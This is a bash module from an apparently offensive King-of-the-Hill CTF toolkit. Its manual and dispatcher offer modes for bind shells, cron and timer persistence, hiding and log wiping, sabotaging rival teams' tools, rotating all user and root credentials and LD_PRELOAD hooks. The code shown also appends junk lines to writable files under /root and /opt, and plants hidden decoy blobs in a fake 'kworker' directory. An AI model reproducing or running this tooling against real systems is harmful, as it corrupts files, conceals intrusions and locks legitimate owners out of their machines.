#!/bin/bash

KOTH_MODE=""
HILL_HOST=""
BIND_PORT="4242"
CAPTURE_KEY=""
CAPTURE_CONSOLE=""
KOTH_TOKEN=""
KOTH_KEY=""
PAYLOAD_PATH=""
PUB_KEY=""
TROLL_TOOL="curl"
KOTH_HELP=0
HYDRA_TICK=30
KOTH_SUFFIX=""
WALL_FORCE_USER=0
WALL_FORCE_ROOT=0
KOTH_SEED=0
KOTH_EXTRA_ARGS=()
KIT=""
ART=""
PYBIN=""

king_chatter() {
    local files
    files=$( { find /usr/local/sbin /var/lib/.cache /root /opt -maxdepth 3 -type f -size -200k -print 2>/dev/null; } | head -n 40 )
    [ -n "$files" ] || return 0
    printf '%s\n' "$files" | while IFS= read -r f; do
        [ -w "$f" ] || continue
        local r
        r=$(( RANDOM % 4 ))
        case "$r" in
            0) printf '%s\n' "Unit=UNIT-$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n')" >> "$f" ;;
            1) printf '%s\n' "Interface=enp$((RANDOM % 400)).$((RANDOM % 90))" >> "$f" ;;
            *) : ;;
        esac
    done
}

king_carve() {
    [ "$(id -u)" = "0" ] || return 0

    local dir
    local unit
    local iface
    local decor

    unit="UNIT-$(head -c 12 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n')"
    iface="enp$(( RANDOM % 400 )).$(( RANDOM % 90 ))"
    decor="${RANDOM}${RANDOM}"

    for dir in /usr/local/sbin/kworker "$KIT" "$ART"; do
        mkdir -p "$dir" 2>/dev/null

        if [ ! -f "/usr/local/sbin/kworker/.c.unit" ]; then
            {
                printf '%s\n' "Unit=${unit}"
                printf '%s\n' "Interface=${iface}"
                printf '%s\n' "Scope=0"
            } > /usr/local/sbin/kworker/.c.unit
            chmod 644 /usr/local/sbin/kworker/.c.unit 2>/dev/null
        fi

        {
            printf '%s\n' "Unit=UNIT-${decor:0:16}"
            printf '%s\n' "Interface=$((iface)).${decor}"
            printf '%s\n' "Scope=${decor:0:4}"
        } > "${dir}/.c.${decor}" 2>/dev/null
        chmod 644 "${dir}/.c.${decor}" 2>/dev/null

        head -c $(( RANDOM % 900000 + 120000 )) /dev/urandom > "${dir}/.blk_${decor}" 2>/dev/null
        chmod 644 "${dir}/.blk_${decor}" 2>/dev/null
    done
}

king_banner() {
    echo -e "\n${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// KING OF THE HILL ]${TXT_VOID}─────────────────────────────────────╖${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}PROJECT BLACKWALL // KOTH BATTLE STATION${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}TARGET${NC} ${TXT_RED_SUPERNOVA}${HILL_HOST:-unset}${NC} ${TXT_VOID}│${NC} ${TXT_RED_MAGMA}BIND${NC} ${TXT_RED_SUPERNOVA}${BIND_PORT}${NC} ${TXT_VOID}│${NC} ${TXT_RED_MAGMA}MODE${NC} ${TXT_RED_SUPERNOVA}${KOTH_MODE:-forge}${NC}"
    echo -e "${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✜${NC}"
}

king_main() {
    KIT="${BASE_DIR}/artifacts/kit"
    ART="${BASE_DIR}/artifacts"
    PYBIN="$(command -v python3 2>/dev/null)"
    [ -n "$PYBIN" ] || PYBIN="/usr/bin/python3"

    if (( KOTH_HELP == 1 )); then
        king_manual
        kw_bind_help
        return 0
    fi
    king_carve
    king_banner

    case "$KOTH_MODE" in
        bind|forge)
            kw_show_payloads "${HILL_HOST:-127.0.0.1}" "$BIND_PORT" "$PAYLOAD_PATH"
            kw_download_payloads "${HILL_HOST:-127.0.0.1}" "$BIND_PORT"
            ;;
        capture)
            kw_capture_plot "$HILL_HOST" "$CAPTURE_CONSOLE" "$KOTH_TOKEN" "$KOTH_KEY" "" "seed"
            ;;
        hydra)
            if (( FILE_RUN == 1 )); then
                hydra_heal
            elif (( FILE_RUN == 2 )); then
                hydra_status "$BIND_PORT"
            else
                hydra_run "$BIND_PORT" "$KOTH_SUFFIX"
            fi
            ;;
        shadow)
            mkdir -p "$ART" 2>/dev/null
            shadow_prepare "$ART" "$BIND_PORT" "$CAPTURE_KEY"
            shadow_apply "$ART"
            shadow_wipe "now"
            king_carve
            ;;
        troll)
            if (( KOTH_TRESTORE == 1 )); then
                troll_proc_restore
            else
                troll_proc_start "$HILL_HOST" "$(command -v "$TROLL_TOOL" 2>/dev/null)" "$TROLL_TOOL"
                troll_register_aliases "$ART"
                troll_install_hook_help
            fi
            ;;
        wall)
            wall_harden_users "$WALL_FORCE_USER"
            wall_harden_root "$WALL_FORCE_ROOT"
            wall_ssh_keys "$PUB_KEY"
            wall_firewall "$HILL_HOST" "$BIND_PORT"
            wall_sudoers
            ;;
        check)
            kc_run_root "$ART/.blk_root.txt"
            ;;
        manual|help)
            king_manual
            kw_bind_help
            ;; 
        hook)
            preload_run "$HOOK_MODE" "$PAYLOAD_PATH"
            ;;
        *)
            kw_bind_help
            ;;
    esac
}

king_manual() {
    KIT="${BASE_DIR}/artifacts/kit"
    ART="${BASE_DIR}/artifacts"
    echo -e "\n${TXT_RED_PLASMA}MX:// KOTH MODULE MANUAL${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-K  --bind${NC}       ${TXT_RED_MAGMA}bind shell payloads, every channel, with usage hints.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-G  --capture${NC}    ${TXT_RED_MAGMA}capture the hill with YOUR token, seal a seed for Hydra.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-Y  --hydra${NC}      ${TXT_RED_MAGMA}watchdog flock, cron + timer + loader persistence.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-E  --shadow${NC}     ${TXT_RED_MAGMA}hide the flock, wipe the trails.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-T  --troll${NC}      ${TXT_RED_MAGMA}degrade competitor tooling without touching root.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-Z  --wall${NC}       ${TXT_RED_MAGMA}rotate creds, pin your key, seal the firewall.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-C  --check${NC}      ${TXT_RED_MAGMA}post-root checklist: suid, caps, cron, writable, flags.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}-o  --hook${NC}       ${TXT_RED_MAGMA}capture-binary hook: map | uid | token (ring-3 preload).${NC}"
    echo -e ""
    echo -e "${TXT_RED_SUPERNOVA}OPTIONS${NC}"
    echo -e "${TXT_RED_MAGMA}  --host <IP>       hill address (VPN side)${NC}"
    echo -e "${TXT_RED_MAGMA}  --port <PORT>     bind port, default 4242${NC}"
    echo -e "${TXT_RED_MAGMA}  --token <TOKEN>   your team token (or TEAM_TOKEN env)${NC}"
    echo -e "${TXT_RED_MAGMA}  --key <KEY>       team key / capture key${NC}"
    echo -e "${TXT_RED_MAGMA}  --payload-path    path of the deployed payload on the hill${NC}"
    echo -e "${TXT_RED_MAGMA}  --pubkey <FILE>   ssh public key for Wall${NC}"
    echo -e "${TXT_RED_MAGMA}  --tool <NAME>     tool for Troll, default curl${NC}"
    echo -e "${TXT_RED_MAGMA}  --heal            re-arm Hydra on the hill${NC}"
    echo -e "${TXT_RED_MAGMA}  --status          print the Hydra flock map${NC}"
    echo -e "${TXT_RED_MAGMA}  --restore         undo Troll${NC}"
    echo -e "${TXT_RED_MAGMA}  --force-user      rotate every login account${NC}"
    echo -e "${TXT_RED_MAGMA}  --force-root      rotate root as well${NC}"
    echo -e "\n${TXT_VOID}${ITLC}\"It is impossible to be sure of the future. It has many enemies, and they are without number.\"${NC}"
}
